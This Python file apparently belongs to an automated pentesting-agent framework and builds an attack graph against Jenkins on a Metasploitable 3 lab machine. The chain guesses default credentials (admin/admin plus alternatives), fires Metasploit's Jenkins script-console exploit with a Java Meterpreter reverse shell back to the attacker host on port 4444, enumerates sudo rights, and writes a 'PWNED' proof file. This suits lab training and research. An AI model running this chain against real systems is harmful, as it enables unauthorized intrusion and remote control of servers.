"""
Example Attack Graph: Jenkins Script Console RCE (Metasploitable 3)

Credentialed web-app exploitation chain against MS3's Jenkins on port 8484.
Default lab credentials are admin/admin; the script console allows arbitrary
Groovy execution which Metasploit weaponizes into a Java Meterpreter session.

Chain:
  recon            — nmap full scan
  jenkins_login    — verify admin/admin works against /j_acegi_security_check
  jenkins_rce      — exploit/multi/http/jenkins_script_console -> java/meterpreter
  privesc_verify   — id / sudo -l from the session
  file_drop        — write proof-of-compromise file

Expected: clean run. If admin/admin is wrong, replanner should propose
alternative Jenkins credentials (Stage Y from docs/plans/credential_retry_plan.md).
"""

from core_agents.attack_graph import (
    AttackGraph, AttackNode, AttackEdge, EdgeCheck,
    EdgeCondition, Tactic,
)


def build_jenkins_rce_graph(target_ip: str, attacker_ip: str) -> AttackGraph:

    graph = AttackGraph.create(
        objective="Compromise the Metasploitable 3 target via Jenkins on port 8484. "
                  "Jenkins ships with admin/admin in the MS3 lab build; use the script "
                  "console to land a Java Meterpreter session, then verify access and "
                  "drop a proof file.",
        target_ip=target_ip,
        name=f"jenkins_rce_{target_ip}",
        attacker_ip=attacker_ip,
        scope=[target_ip],
        description="Jenkins script-console RCE happy-path baseline against MS3.",
        metadata={"scenario": "jenkins_script_console_rce", "target_type": "metasploitable3"},
    )

    # =========================================================================
    # NODES
    # =========================================================================

    graph.add_node(AttackNode(
        id="recon",
        label="Nmap Full Scan",
        tactic=Tactic.RECONNAISSANCE.value,
        technique_id="T1046",
        technique_name="Network Service Discovery",
        agent_type="recon",
        goal="Map the target's attack surface and confirm Jenkins on 8484",
        objective=f"Full port scan with service versioning on {target_ip}.",
        target_ip=target_ip,
        tool_name="nmap",
        commands_to_run=[f"nmap -sV --top-ports 1000 {target_ip}"],
        tags=["nmap", "full_scan"],
    ))

    graph.add_node(AttackNode(
        id="jenkins_login",
        label="Verify Jenkins admin/admin",
        tactic=Tactic.CREDENTIAL_ACCESS.value,
        technique_id="T1110.001",
        technique_name="Brute Force: Password Guessing",
        agent_type="exploit",
        goal="Confirm valid Jenkins credentials before attempting RCE",
        objective=f"Try admin/admin against Jenkins login form on {target_ip}:8484.",
        target_ip=target_ip,
        tool_name="metasploit",
        module="auxiliary/scanner/http/jenkins_login",
        module_options={
            "RHOSTS": target_ip,
            "RPORT": 8484,
            "USERNAME": "admin",
            "PASSWORD": "admin",
            "STOP_ON_SUCCESS": True,
        },
        module_options_alternatives={
            "PASSWORD": ["jenkins", "password", "vagrant"],
        },
        max_retries=2,
        tags=["jenkins", "login", "credentials"],
    ))

    graph.add_node(AttackNode(
        id="jenkins_rce",
        label="Jenkins Script Console RCE",
        tactic=Tactic.INITIAL_ACCESS.value,
        technique_id="T1190",
        technique_name="Exploit Public-Facing Application",
        agent_type="exploit",
        goal="Obtain a session by exploiting the Jenkins script console",
        objective=f"Run exploit/multi/http/jenkins_script_console against "
                  f"{target_ip}:8484 with admin/admin; payload java/meterpreter/reverse_tcp.",
        target_ip=target_ip,
        tool_name="metasploit",
        module="exploit/multi/http/jenkins_script_console",
        module_options={
            "RHOSTS": target_ip,
            "RPORT": 8484,
            "TARGETURI": "/",
            "USERNAME": "admin",
            "PASSWORD": "admin",
        },
        payload="java/meterpreter/reverse_tcp",
        payload_options={
            "LHOST": attacker_ip,
            "LPORT": 4444,
        },
        max_retries=3,
        tags=["jenkins", "script_console", "rce", "meterpreter"],
    ))

    graph.add_node(AttackNode(
        id="privesc_verify",
        label="Verify Session Privileges",
        tactic=Tactic.DISCOVERY.value,
        technique_id="T1033",
        technique_name="System Owner/User Discovery",
        agent_type="impact",
        goal="Identify session privilege level for subsequent steps",
        objective="Run id, whoami, and sudo -l against the new session.",
        target_ip=target_ip,
        tool_name="session",
        commands_to_run=[
            "id",
            "whoami",
            "sudo -n -l",
        ],
        max_retries=1,
        tags=["privesc", "sudo", "verify"],
    ))

    graph.add_node(AttackNode(
        id="file_drop",
        label="Drop Proof-of-Compromise File",
        tactic=Tactic.IMPACT.value,
        technique_id="T1485",
        technique_name="Data Destruction",
        agent_type="impact",
        goal="Demonstrate Jenkins compromise with a written artifact",
        objective="Write a proof-of-compromise file via the session.",
        target_ip=target_ip,
        tool_name="session",
        commands_to_run=[
            "echo '{marker}' > {target_file}",
            "echo \"Compromised at $(date)\" >> {target_file}",
            "echo \"User: $(whoami)\" >> {target_file}",
            "cat {target_file}",
        ],
        command_params={
            "target_file": "/tmp/pwned_jenkins.txt",
            "marker": "PWNED via Jenkins script console",
        },
        command_params_alternatives={
            "target_file": ["/var/tmp/pwned_jenkins.txt", "/dev/shm/pwned_jenkins.txt"],
        },
        max_retries=3,
        metadata={"target_file": "/tmp/pwned_jenkins.txt"},
        tags=["impact", "file_drop", "proof"],
    ))

    # =========================================================================
    # EDGES
    # =========================================================================

    graph.connect(
        "recon", "jenkins_login",
        checks=[
            EdgeCheck(
                field="ports", operator="any_port",
                expected={"port": 8484},
                description="Jenkins service is open on 8484",
            ),
        ],
        evidence="Nmap found Jenkins on port 8484",
        rationale="Verify admin/admin before attempting authenticated RCE",
    )

    graph.connect(
        "jenkins_login", "jenkins_rce",
        checks=[
            EdgeCheck(
                field="success", operator="equals", expected="True",
                description="Valid Jenkins credentials confirmed",
            ),
        ],
        evidence="Jenkins admin login succeeded",
        rationale="Use confirmed creds to fire the script console RCE",
    )

    graph.connect(
        "jenkins_rce", "privesc_verify",
        checks=[
            EdgeCheck(
                field="session_id", operator="exists",
                description="Java meterpreter session opened",
            ),
        ],
        evidence="Got Java meterpreter session via Jenkins",
        rationale="Inspect the session's privileges before deciding next step",
    )

    graph.connect(
        "privesc_verify", "file_drop",
        checks=[
            EdgeCheck(
                field="success", operator="equals", expected="True",
                description="Session is usable",
            ),
        ],
        evidence="Session privileges enumerated",
        rationale="Drop the proof-of-compromise file as the impact step",
    )

    return graph


# =============================================================================
# CLI
# =============================================================================

if __name__ == "__main__":
    graph = build_jenkins_rce_graph(
        target_ip="192.168.34.7",
        attacker_ip="192.168.34.6",
    )
    print(graph.summary())
    print()

    out_path = "examples/jenkins_rce_graph.json"
    graph.save(out_path)
    print(f"Saved to {out_path}")

    loaded = AttackGraph.load(out_path)
    print(f"\nReloaded: {loaded}")
    print(f"Ready nodes: {loaded.ready_nodes()}")
